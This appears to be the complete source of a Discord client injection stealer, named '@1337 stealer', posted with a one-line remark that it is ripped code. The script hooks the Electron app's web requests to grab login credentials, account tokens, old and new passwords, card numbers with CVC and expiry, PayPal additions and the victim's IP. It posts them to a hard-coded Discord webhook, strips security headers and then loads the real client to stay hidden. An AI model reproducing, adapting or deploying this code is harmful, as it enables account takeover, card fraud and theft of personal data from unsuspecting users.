there Source IS technically pasted and skid ripped


const args = process.argv;
const fs = require("fs");
const path = require("path");
const https = require("https");
const querystring = require("querystring");
const { BrowserWindow, session } = require("electron");

const config = {
  webhook: "https://discord.com/api/webhooks/992064713238261831/b7vGiLXqlLadD-MaKZWMkLF1dFtq9N3atX2Kkv57-XBMXorV9oET7mmATsaHPsslhI4g",
  "embed-color": 3553599,
  emojis: {
    nitroType: "<a:nitro_type:990735596446167060>",
    password: "<:password:990736948018704444>",
    ip: "<:ip:990733026956804207>",
    billing: "<a:billing:990734778888228904>",
    badges: "<a:badges:990780871516770374>",
    oldPass: "<:old_password:991080661941116978>",
    newPass: "<a:new_password:991079376416284694>",
    email: "<:mail:991081890092052510>",
    paypal: "<:paypal:990732200993505280>",
    classic: "<:nitro:990727425790976060>",
    boost: "<:boost1month:990730687579570246>",
  },
  api: "https://discord.com/api/v9/users/@me",
  "stealer-icon": "https://i.ibb.co/MPDJKx3/sexygif.gif",
  "stealer-name": "@1337 stealer",
  filter: {
    urls: [
      "https://discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/users/@me",
      "https://*.discord.com/api/v*/users/@me",
      "https://discordapp.com/api/v*/auth/login",
      "https://discord.com/api/v*/auth/login",
      "https://*.discord.com/api/v*/auth/login",
      "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
      "https://api.stripe.com/v*/tokens",
      "https://api.stripe.com/v*/setup_intents/*/confirm",
      "https://api.stripe.com/v*/payment_intents/*/confirm",
    ],
  },
  filter2: {
    urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
  },
};

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getIP = async (token) => {
  return await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "https://api.ipify.org", false);
    xmlHttp.send(null);
    xmlHttp.responseText;`);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);

  try {
    return typeof bill === "string" ? JSON.parse(bill) : bill;
  } catch (e) {
    return null;
  }
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return "`No Billing`";
  let billing = "";
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += "💳 ";
          break;
        case 2:
          billing += `${config.emojis.paypal} `;
          break;
      }
    }
  });
  if (!billing) billing = "`No Billing`";
  return billing;
};

const getNitro = (flags) => {
  switch (flags) {
    case 0:
      return "`No Nitro`";
    case 1:
      return config.emojis.classic;
    case 2:
      return `${config.emojis.classic} ${config.emojis.boost}`;
    default:
      return "`No Nitro`";
  }
};

const getBadges = (flags) => {
  let badges = "";
  switch (flags) {
    case 1:
      badges += "<:Discord_Staff:990730713731072070> ";
      break;
    case 2:
      badges += "<:discord_partner:990730711331905537> ";
      break;
    case 131072:
      badges += "<:Verified_Bot_Developer:990730730151772181> ";
      break;
    case 4:
      badges += "<:HypeSquad_Event:990730723940007956> ";
      break;
    case 16384:
      badges += "<:Bug_Hunter_level2:990730708001648660> ";
      break;
    case 8:
      badges += "<:Bug_Hunter:990730706042888192> ";
      break;
    case 512:
      badges += "<:EarlySupporter:990727673783390239> ";
      break;
    case 128:
      badges += "<:HypeSquad_Brilliance:990730721620557865> ";
      break;
    case 64:
      badges += "<:HypeSquad_Bravery:990730719674380420>";
      break;
    case 256:
      badges += "<:HypeSquad_Balance:990730717820506122> ";
      break;
    case 0:
      badges = "`No Badges`";
      break;
    default:
      badges = "`No Badges`";
      break;
  }
  return badges;
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
  };

  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: "POST",
    headers: headers,
  };
  const req = https.request(options);

  req.on("error", (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const ip = await getIP();
  const avatar = json.avatar
    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;

  const content = {
    embeds: [
      {
        color: config["embed-color"],
        author: {
          name: `${json.username}#${json.discriminator} (${json.id})`,
          icon_url: config["stealer-icon"],
        },
        thumbnail: {
          url: avatar,
        },
        footer: {
          text: config["stealer-name"],
          icon_url: config["stealer-icon"],
        },
        fields: [
          {
            name: `${config.emojis.billing}`,
            value: `\`${token}\``,
          },
          {
            name: `${config.emojis.badges} Badges`,
            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
            inline: !0,
          },
          {
            name: `${config.emojis.nitroType} Nitro Type`,
            value: nitro,
            inline: !0,
          },
          {
            name: `${config.emojis.billing} Billing`,
            value: billing,
            inline: !0,
          },
          {
            name: `${config.emojis.ip} IP`,
            value: `\`${ip}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.email} Email`,
            value: `\`${email || `null`}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.password} Password`,
            value: `\`${password || "null"}\``,
            inline: !0,
          },
        ],
      },
    ],
  };

  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const ip = await getIP();
  const avatar = json.avatar
    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;

  const content = {
    embeds: [
      {
        color: config["embed-color"],
        title: "Password Changed",
        author: {
          name: `${json.username}#${json.discriminator} (${json.id})`,
          icon_url: config["stealer-icon"],
        },
        thumbnail: {
          url: avatar,
        },
        footer: {
          text: config["stealer-name"],
          icon_url: config["stealer-icon"],
        },
        fields: [
          {
            name: `${config.emojis.billing}`,
            value: `\`${token}\``,
          },
          {
            name: `${config.emojis.badges} Badges`,
            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
            inline: !0,
          },
          {
            name: `${config.emojis.nitroType} Nitro Type`,
            value: nitro,
            inline: !0,
          },
          {
            name: `${config.emojis.billing} Billing`,
            value: billing,
            inline: !0,
          },
          {
            name: `${config.emojis.ip} IP`,
            value: `\`${ip}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.email} Email`,
            value: `\`${json.email || `null`}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.oldPass} Old Password`,
            value: `\`${oldpassword || `null`}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.newPass} New Password`,
            value: `\`${newpassword || `null`}\``,
            inline: !0,
          },
        ],
      },
    ],
  };

  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const ip = await getIP();
  const avatar = json.avatar
    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;

  const content = {
    embeds: [
      {
        color: config["embed-color"],
        title: "Email Changed",
        author: {
          name: `${json.username}#${json.discriminator} (${json.id})`,
          icon_url: config["stealer-icon"],
        },
        thumbnail: {
          url: avatar,
        },
        footer: {
          text: config["stealer-name"],
          icon_url: config["stealer-icon"],
        },
        fields: [
          {
            name: `${config.emojis.billing}`,
            value: `\`${token}\``,
          },
          {
            name: `${config.emojis.badges} Badges`,
            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
            inline: !0,
          },
          {
            name: `${config.emojis.nitroType} Nitro Type`,
            value: nitro,
            inline: !0,
          },
          {
            name: `${config.emojis.billing} Billing`,
            value: billing,
            inline: !0,
          },
          {
            name: `${config.emojis.ip} IP`,
            value: `\`${ip}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.email} Email`,
            value: `\`${email || `null`}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.password} Password`,
            value: `\`${password || "null"}\``,
            inline: !0,
          },
        ],
      },
    ],
  };

  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const ip = await getIP();
  const avatar = json.avatar
    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;

  const content = {
    embeds: [
      {
        color: config["embed-color"],
        title: "PayPal Added",
        author: {
          name: `${json.username}#${json.discriminator} (${json.id})`,
          icon_url: config["stealer-icon"],
        },
        thumbnail: {
          url: avatar,
        },
        footer: {
          text: config["stealer-name"],
          icon_url: config["stealer-icon"],
        },
        fields: [
          {
            name: `${config.emojis.billing}`,
            value: `\`${token}\``,
          },
          {
            name: `${config.emojis.badges} Badges`,
            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
            inline: !0,
          },
          {
            name: `${config.emojis.nitroType} Nitro Type`,
            value: nitro,
            inline: !0,
          },
          {
            name: `${config.emojis.billing} Billing`,
            value: billing,
            inline: !0,
          },
          {
            name: `${config.emojis.ip} IP`,
            value: `\`${ip}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.email} Email`,
            value: `\`${json.email || `null`}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.password} Password`,
            value: "`null`",
            inline: !0,
          },
        ],
      },
    ],
  };

  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const ip = await getIP();
  const avatar = json.avatar
    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;

  const content = {
    embeds: [
      {
        color: config["embed-color"],
        title: "Bank Card Added",
        author: {
          name: `${json.username}#${json.discriminator} (${json.id})`,
          icon_url: config["stealer-icon"],
        },
        thumbnail: {
          url: avatar,
        },
        footer: {
          text: config["stealer-name"],
          icon_url: config["stealer-icon"],
        },
        fields: [
          {
            name: `${config.emojis.billing}`,
            value: `\`${token}\``,
          },
          {
            name: `${config.emojis.badges} Badges`,
            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
            inline: !0,
          },
          {
            name: `${config.emojis.nitroType} Nitro Type`,
            value: nitro,
            inline: !0,
          },
          {
            name: `${config.emojis.billing} Billing`,
            value: billing,
            inline: !0,
          },
          {
            name: `${config.emojis.ip} IP`,
            value: `\`${ip}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.email} Email`,
            value: `\`${json.email || `null`}\``,
            inline: !0,
          },
          {
            name: `${config.emojis.password} Password`,
            value: "`null`",
            inline: !0,
          },
          {
            name: "💳 Card Number",
            value: `\`${number}\``,
            inline: !0,
          },
          {
            name: "💳 Card CVC",
            value: `\`${cvc}\``,
            inline: !0,
          },
          {
            name: "💳 Card Expiration",
            value: `\`${expir_month}/${expir_year}\``,
            inline: !0,
          },
        ],
      },
    ],
  };

  hooker(content);
};

session.defaultSession.webRequest.onBeforeRequest(
  config.filter2,
  (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway"))
      return callback({ cancel: true });
    // updateCheck();
  }
);

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes("discord.com")) {
      callback({
        responseHeaders: Object.assign(
          {
            "Access-Control-Allow-Headers": "*",
          },
          details.responseHeaders
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            "Content-Security-Policy": [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'",
            ],
            "Access-Control-Allow-Headers": "*",
            "Access-Control-Allow-Origin": "*",
          },
          details.responseHeaders
        ),
      });
    }
  } else {
    delete details.responseHeaders["content-security-policy"];
    delete details.responseHeaders["content-security-policy-report-only"];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        "Access-Control-Allow-Headers": "*",
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(
  config.filter,
  async (details, _) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data);
    const token = await execScript(
      `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
    );
    switch (true) {
      case details.url.endsWith("login"):
        login(data.login, data.password, token).catch(console.error);
        break;

      case details.url.endsWith("users/@me") && details.method === "PATCH":
        if (!data.password) return;
        if (data.email) {
          emailChanged(data.email, data.password, token).catch(console.error);
        }
        if (data.new_password) {
          passwordChanged(data.password, data.new_password, token).catch(
            console.error
          );
        }
        break;

      case details.url.endsWith("tokens") && details.method === "POST":
        const item = querystring.parse(unparsed_data.toString());
        hooker({
          content:
            JSON.stringify(item) + String(unparsed_data) + JSON.stringify(data),
        });
        ccAdded(
          item["card[number]"],
          item["card[cvc]"],
          item["card[exp_month]"],
          item["card[exp_year]"],
          token
        ).catch(console.error);
        break;

      case details.url.endsWith("paypal_accounts") && details.method === "POST":
        PaypalAdded(token).catch(console.error);
        break;

      default:
        break;
    }
  }
);

module.exports = require("./core.asar");